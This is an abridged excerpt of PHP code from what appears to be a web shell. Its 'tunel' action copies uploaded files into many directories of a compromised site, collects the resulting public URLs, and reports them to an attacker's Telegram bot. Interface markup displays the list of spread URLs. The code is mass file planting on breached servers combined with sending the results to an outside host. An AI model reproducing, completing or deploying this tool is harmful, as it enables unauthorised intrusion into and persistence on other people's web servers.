...
function td_actions() {
    ...
    if ($act==='tunel' && isset($_FILES['tunel_files'])) {
        ...
        $n        = count($names);
        $ok=0; $fail=0; $copies=array(); $fnames=array();
        $uploadedUrls = array();
        ...
        for ($i=0; $i<$n; $i++) {
            ...
            foreach ($targets as $t) {
                ...
                $relPath = td_rel($t).'/'.$fname;
                $fileUrl = $scheme.'://'.$host.$relPath;
                if ($first) {
        ...
        foreach ($uploadedUrls as $u) { $tgDetail .= "<code>".$u."</code>\n"; }
        td_notify($TG_TOKEN,$TG_CHATID,"\xF0\x9F\x8C\x8A TUNEL UPLOAD",$tgDetail);

        $urlHtml = '';
        foreach ($uploadedUrls as $u) {
            $urlHtml .= '<div class="tunel-url-item"><span class="tunel-url-dot">&#x25CF;</span><a href="'.htmlspecialchars($u).'" target="_blank" class="tunel-url-link">'.htmlspecialchars($u).'</a></div>';
        }

        $summaryText = '&#x1F30A; TUNEL: '.$ok.' file &rarr; '.count($uploadedUrls).' URL berhasil disebarkan ke '.$dirCount.' direktori.'.($fail?' Gagal: '.$fail.'.':'');
        $msg = array(
            'type' => 'tunel',
            'text' => $summaryText,
            'urls' => $urlHtml,
...
.tunel-result-body{background:rgba(0,0,0,0.3);padding:12px 14px;max-height:320px;overflow-y:auto}
.tunel-url-item{display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid rgba(0,255,65,0.06)}
.tunel-url-item:last-child{border-bottom:none}
.tunel-url-dot{color:var(--green);font-size:8px;flex-shrink:0}
    ...
    <div class="content">
      ...
      <?php if (!empty($msg['text'])): ?>
        ...
        <textarea id="tunelUrlRaw" style="position:absolute;left:-9999px;top:-9999px" readonly><?php
          $rawUrls=array();
          preg_match_all('/href="([^"]+)"/',$msg['urls'],$m);
          if (!empty($m[1])) foreach($m[1] as $u) $rawUrls[]=htmlspecialchars_decode($u);
          echo implode("\n",$rawUrls);
        ?></textarea>
        <?php else: ?>
